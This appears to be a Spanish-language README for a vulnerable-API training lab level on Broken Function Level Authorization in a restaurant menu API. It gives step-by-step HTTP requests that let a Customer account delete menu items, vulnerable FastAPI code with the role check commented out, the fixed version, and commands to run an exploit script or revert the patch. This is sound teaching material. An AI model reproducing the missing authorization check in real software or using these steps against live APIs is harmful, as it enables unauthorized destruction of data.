# Level 1: Broken Function Level Authorization

## 📌 Inicio Rápido

### Prerequisitos
Asegúrate de tener activado tu entorno virtual de Python:

```bash
source venv/bin/activate
```

### Comandos de Prueba

#### 1️⃣ Ejecutar exploit para ver la vulnerabilidad
```bash
python3 new_parche_proyecto/levels/lvl_1/scripts/exploit_lvl1.py
```

#### 2️⃣ Aplicar parche de seguridad
```bash
sudo cp new_parche_proyecto/levels/lvl_1/fix/delete_menu_item_service.py app/apis/menu/services/delete_menu_item_service.py
```

#### 3️⃣ Verificar que la vulnerabilidad fue corregida
```bash
python3 new_parche_proyecto/levels/lvl_1/scripts/exploit_lvl1.py
```

#### 4️⃣ Revertir parche (opcional)
```bash
sudo cp new_parche_proyecto/levels/lvl_1/unpatch/delete_menu_item_service.py app/apis/menu/services/delete_menu_item_service.py
```

---

## 📋 Clasificación OWASP
**API5:2023 - Broken Function Level Authorization (BFLA)**

## 🎯 Descripción de la Vulnerabilidad

El endpoint `DELETE /menu/{item_id}` permite a cualquier usuario autenticado eliminar items del menú, sin importar su rol. Esta funcionalidad debería estar restringida únicamente a usuarios con roles administrativos (Employee, Chef), pero la validación de autorización basada en roles está comentada o ausente.

### El Problema

El código vulnerable contiene la validación de roles comentada:

```python
@router.delete("/menu/{item_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_menu_item(
    item_id: int,
    current_user: Annotated[User, Depends(get_current_user)],
    db: Session = Depends(get_db),
    # auth=Depends(RolesBasedAuthChecker([UserRole.EMPLOYEE, UserRole.CHEF])),
):
    utils.delete_menu_item(db, item_id)
```

Esto significa que:
- ✅ Se valida que el usuario esté autenticado (`get_current_user`)
- ❌ **NO** se valida el rol del usuario
- ❌ Cualquier Customer puede ejecutar funciones administrativas

## 🔓 Cómo se Explota

### Paso 1: Crear Cuenta Customer
El atacante registra una cuenta normal, que por defecto recibe el rol `Customer`:

```bash
POST /register
Content-Type: application/json

{
  "username": "attacker",
  "password": "pass123",
  "phone_number": "555-1234",
  "first_name": "Attack",
  "last_name": "User"
}
```

### Paso 2: Autenticación
Obtener token de acceso:

```bash
POST /token
Content-Type: application/x-www-form-urlencoded

username=attacker&password=pass123
```

### Paso 3: Listar Menú
Obtener IDs de items disponibles:

```bash
GET /menu
Authorization: Bearer {token}
```

### Paso 4: Eliminar Items
Ejecutar función administrativa sin privilegios:

```bash
DELETE /menu/8
Authorization: Bearer {token}
```

**Respuesta:**
```
HTTP/1.1 204 No Content
```

## 🛡️ Cómo Solucionarlo

### Solución: Habilitar RolesBasedAuthChecker

**Código Vulnerable:**
```python
@router.delete("/menu/{item_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_menu_item(
    item_id: int,
    current_user: Annotated[User, Depends(get_current_user)],
    db: Session = Depends(get_db),
):
    utils.delete_menu_item(db, item_id)
```

**Código Seguro:**
```python
@router.delete("/menu/{item_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_menu_item(
    item_id: int,
    current_user: Annotated[User, Depends(get_current_user)],
    db: Session = Depends(get_db),
    auth=Depends(RolesBasedAuthChecker([UserRole.EMPLOYEE, UserRole.CHEF])),
):
    utils.delete_menu_item(db, item_id)
```

### Principios de Seguridad Aplicados

1. **Least Privilege**: Usuarios solo pueden ejecutar funciones acordes a su rol
2. **Role-Based Access Control (RBAC)**: Validar roles en TODAS las funciones sensibles
3. **Defense in Depth**: Múltiples capas de validación (autenticación + autorización)
4. **Secure by Default**: Las funciones deben ser restrictivas por defecto

### Validación Completa

Para funciones administrativas, siempre implementar:

```python
def administrative_function(
    current_user: User = Depends(get_current_user),
    auth = Depends(RolesBasedAuthChecker([UserRole.ADMIN, UserRole.EMPLOYEE]))
):
    pass
```

## 🔍 Escenarios de Ataque

### Escenario 1: Sabotaje Interno
Un empleado descontento con cuenta de Customer elimina todo el menú antes de salir de la empresa.

### Escenario 2: Competencia Maliciosa
Un competidor crea una cuenta y elimina los productos más populares durante horas pico.

### Escenario 3: Ransomware Digital
Atacante elimina todo el menú y exige pago para restaurar los datos.

### Escenario 4: Prueba de Penetración
Tester descubre la vulnerabilidad y demuestra eliminación de items como PoC.

## 🔬 Prueba de Concepto

Ejecutar el exploit:
```bash
python exploit_lvl1.py
```

El script:
1. Creará un usuario Customer
2. Obtendrá token de autenticación
3. Consultará el menú actual
4. Intentará eliminar el item ID=8
5. Verificará si la eliminación fue exitosa
6. Mostrará si la API es vulnerable o está protegida

## 📚 Referencias

- OWASP API Security Top 10 2023: API5:2023
- CWE-285: Improper Authorization
- CWE-863: Incorrect Authorization

